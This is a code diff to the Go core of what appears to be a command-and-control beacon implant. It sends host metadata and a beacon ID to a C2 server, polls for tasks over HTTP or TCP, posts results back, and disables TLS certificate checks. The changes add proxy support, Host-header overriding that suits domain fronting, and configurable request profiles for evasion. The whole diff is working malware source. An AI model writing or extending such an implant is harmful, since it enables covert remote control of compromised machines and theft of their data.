@@ -3,33 +3,37 @@ package core
 import (
 	"bytes"
 	"crypto/tls"
-	"fmt"
 	"io"
-	"io/ioutil"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 )
 
 var (
 	Client = &http.Client{
-		Timeout: 10*time.Second,
+		Timeout:   10*time.Second,
 		Transport: &http.Transport{
+			Proxy: func(*http.Request) (*url.URL, error) {
+				if ProxyURL == "" {return nil, nil}
+				return url.Parse(ProxyURL)
+			},
 			TLSHandshakeTimeout: 10*time.Second,
-			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+			TLSClientConfig:	 &tls.Config{InsecureSkipVerify: true},
 		},
 	}
 )
 
 func init() {
-	var MetaByte []byte
-	MetaByte, MetaInfo = MetaInit()
 	if strings.HasPrefix(C2_URL, "tcp") {
 		TCP(JoinBytes(_IntToByte(4, len(MetaByte)+4), _IntToByte(4, BeaconID), MetaByte))
 	} else {
-		HTTP("GET", GetURL, JoinMap(Headers, map[string]string{"Cookie": MetaInfo}), nil, func(){os.Exit(0)})
+		SetProperty(PullInfo, "MetaData", MetaByte)
+		SetProperty(PushInfo, "BeaconID", []byte(strconv.Itoa(BeaconID)))
+		HTTP("GET", GetURL(PullInfo), GetHeader(PullInfo), nil, func(){os.Exit(0)})
 	}
 }
 
@@ -60,23 +64,26 @@ func TCP(Data []byte) {
 	}
 }
 
-func HTTP(Method, URL string, Header map[string]string, Body io.Reader, Error func()) []byte {
+func HTTP(Method, URL string, Header map[string]string, Body io.Reader, Error func()) ([]byte, error) {
 	Req, _ := http.NewRequest(Method, URL, Body)
 	for Key, Value := range Header {
-		Req.Header.Set(Key, Value)
+		if Key == "Host" {
+			Req.Host = Value
+		} else {
+			Req.Header.Set(Key, Value)
+		}
 	}
 	Res, err := Client.Do(Req)
-	if err != nil { Error(); return nil }
+	if err != nil { Error(); return nil, err }
 	defer Res.Body.Close()
-	Data, _ := ioutil.ReadAll(Res.Body)
-	return Data
+	return io.ReadAll(Res.Body)
 }
 
 func Pull() *bytes.Buffer {
 	time.Sleep(GetWaitTime())
 	if strings.HasPrefix(C2_URL, "http") {
-		Header := JoinMap(Headers, map[string]string{"Cookie": MetaInfo})
-		return ParseBytes(HTTP("GET", GetURL, Header, nil, func(){}))
+		Data, _ := HTTP("GET", GetURL(PullInfo), GetHeader(PullInfo), nil, func(){})
+		return ParseBytes(GetOutput(Data))
 	}
 	if Conn, OK := Tunnel.Load(BeaconID); strings.HasPrefix(C2_URL, "tcp") && OK {
 		Len := _ByteToInt(ReadFrom(Conn.(net.Conn), 4))
@@ -96,7 +103,7 @@ func Push() {
 			}
 		}
 		if strings.HasPrefix(C2_URL, "http") && Buffer.Len() > 0 {
-			HTTP("POST", fmt.Sprintf(PostURL, BeaconID), Headers, &Buffer, func(){})
+			HTTP("POST", GetURL(PushInfo), GetHeader(PushInfo), SetOutput(Buffer.Bytes()), func(){})
 		}
 		FileID.Range(func(FID, _ interface{}) bool {
 			FileID.Store(FID, true); return true
